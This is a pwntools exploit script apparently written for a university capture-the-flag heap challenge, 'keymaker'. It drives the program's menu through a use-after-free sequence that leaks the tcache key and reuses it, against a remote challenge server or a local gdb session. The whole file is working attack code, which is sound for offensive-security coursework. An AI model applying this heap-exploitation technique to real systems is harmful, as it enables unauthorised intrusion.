from jedi.cache import time_cache
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./keymaker"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1223)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"Choose an option:\n")
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def make(p, key: str, tcache_key = None):
    p.recvuntil(b"Give me an identifier for the key (max 8 characters)\n")
    p.recvuntil(b"> ")
    p.send(key.encode())
    p.recvuntil(b"Key created! How do you like it??\n")
    p.recvline()
    p.recvuntil(b"What is tcache key? Do you have any guesses?\n")
    if tcache_key:
        p.send(str(tcache_key))
    else:
        p.sendline()

def review(p):
    p.recvuntil(b"Let's take a look at this key!\n")
    p.recvuntil(b"AAAAAAAA")
    free_key_leak =  u64(p.recvline().strip().ljust(8, b'\x00'))
    print(f'Key leak: {hex(free_key_leak)}')
    p.recvuntil(b"What is tcache key? Do you have any guesses?\n")
    p.sendline()
    return free_key_leak

def edit(p, key: str):
    p.recvuntil(b"What do you want your key to say?\n")
    p.recvuntil(b"> ")
    p.send(key.encode())
    p.recvuntil(b"What is tcache key? Do you have any guesses?\n")
    p.sendline()
    p.recvuntil(b'Nope, keep trying!\n')

def delete(p):
    p.recvuntil(b"What is tcache key? Do you have any guesses?\n")
    p.sendline()
    p.recvuntil(b'Nope, keep trying!\n')

menu(p, 1)
make(p, "AAAAAAAA")

menu(p, 4)
delete(p)

menu(p, 3)
edit(p, "AAAAAAAA")

menu(p, 2)
tcache_key = review(p)

menu(p, 1)
make(p, 'AAAAAAAA', tcache_key)
p.interactive()